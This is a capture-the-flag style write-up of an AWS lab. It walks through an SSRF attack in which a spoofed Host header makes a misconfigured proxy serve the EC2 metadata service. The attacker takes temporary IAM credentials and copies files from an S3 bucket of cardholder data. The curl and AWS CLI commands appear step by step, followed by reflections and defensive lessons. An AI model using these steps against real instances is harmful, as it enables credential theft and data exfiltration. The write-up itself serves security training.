# Solution

To complete the scenario and exfiltrate the target S3 data, I performed the following steps:

## a. Enumerate the EC2 Metadata

Following hits, I send a simple HTTP request to the target EC2 server’s IP with curl.
```
export EC2_PUBLIC_IP=44.203.226.187
curl -i http://${EC2_PUBLIC_IP}
```
Server response 
```
[content omitted]
<body>
    <h1>⚠️ Proxy Configuration Error</h1>
    <p>This server is configured to proxy requests to the EC2 metadata service. Please modify your request's 'host' header and try again.</p>
    <div class="hint">
        <p><strong>Hint:</strong> The metadata service is available at <code>169.254.169.254</code></p>
    </div>
</body>
[content omitted]
```
According to response, I modify the request’s Host header and request again.

```
curl -i -H "Host: 169.254.169.254" "http://44.203.226.187/latest/meta-data/"
```
I get the metadatas.
```bash
HTTP/1.1 200 OK
[content omitted]
identity-credentials/
[content omitted]
```

## b. Retrieve Temporary AWS Credentials from IMDS
According [EC2 metadata documents](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html), I tried credential relative requests.

```bash
# This works
curl -s -H "Host: 169.254.169.254" \
  "http://$IP/latest/meta-data/iam/security-credentials/cloud-breach-s3-rabugja2-banking-WAF-Role"

# This permission got denied
curl -s -H "Host: 169.254.169.254" \
  "http://$IP/latest/meta-dataidentity-credentials/ec2/security-credentials/ec2-instance
```
both get similer formatted responses
```
{
  "Code" : "Success",
  "LastUpdated" : "2026-02-03T23:25:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "...",
  "SecretAccessKey" : "...",
  "Token" : "..."
  "Expiration" : "2026-02-04T06:00:00Z"
}
```

Setting the credential to my shell. [id_credentials_temp_use-resources Docs](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html)
```bash
AWS_ACCESS_KEY_ID=ASIA...
AWS_SECRET_ACCESS_KEY=...
AWS_SESSION_TOKEN=...
export AWS_REGION="us-east-1"
```
Verify the crendential
```bash
❯ aws sts get-caller-identity | tee

{
    "UserId": "AROA3EFDNBBL5NJB23PAV:i-00a2e05452a119f8f",
    "Account": "764846868567",
    "Arn": "arn:aws:sts::764846868567:assumed-role/cloud-breach-s3-rabugja2-banking-WAF-Role/i-00a2e05452a119f8f"
}
```

### c. List and Exfiltrate S3 Bucket Data

Finlly, I got the credential. Now I can exfiltrate the files.

```bash
❯ aws s3 ls
2026-02-03 18:24:39 cloud-breach-s3-rabugja2-cardholder-data
```
```bash
❯ aws s3 ls s3://cloud-breach-s3-rabugja2-cardholder-data

2026-02-03 18:24:40        470 FLAG.txt
2026-02-03 18:24:40        366 cardholder_data_primary.csv
2026-02-03 18:24:40        381 cardholder_data_secondary.csv
```

```bash
❯ aws s3 cp \
  s3://cloud-breach-s3-rabugja2-cardholder-data/FLAG.txt .
```

# Reflection
 
## What was your approach?

My approach was to exploit a misconfiguration that bridged the external network to the instance’s internal AWS metadata service. 
- I began by probing the exposed server and found that it functioned as a reverse proxy to the EC2 metadata URL. 
- Next,I request with a custom Host header to fool the proxy into fetching data from the instance’s IMDS(SSRF).
- Then, I configured my AWS CLI with the stolen keys
- Finally, access the FLAG in S3 bucket.

## What was the biggest challenge?

The biggest challenge was figuring out where the credentials were actually located.
Another point where I got stuck was not understanding why including the IMDS IP address (169.254.169.254) in the request header would return sensitive information.

## How did you overcome the challenges?

I overcame these challenges primarily by reviewing the EC2 Instance Metadata documentation and using trial and error to observe what data could be retrieved.
As for the proxy-related behavior. I consulted AI, and I eventually discovered that the behavior was due to a proxy configured via user-data.

## What led to the breakthrough?

Seeing SecretAccessKey,Token, AccessKeuId from responses was the key signal that the approach was working.

## On the blue side, what lessons can be applied to properly defend against this type of breach?

- Enforce IMDSv2 on all EC2 instances to prevent metadata access via simple HTTP requests.
- Blocking requests to internal or link-local addresses and only allowing necessary destinations.
- Apply IAM least privilege so roles have minimal access, limiting damage if credentials are stolen.
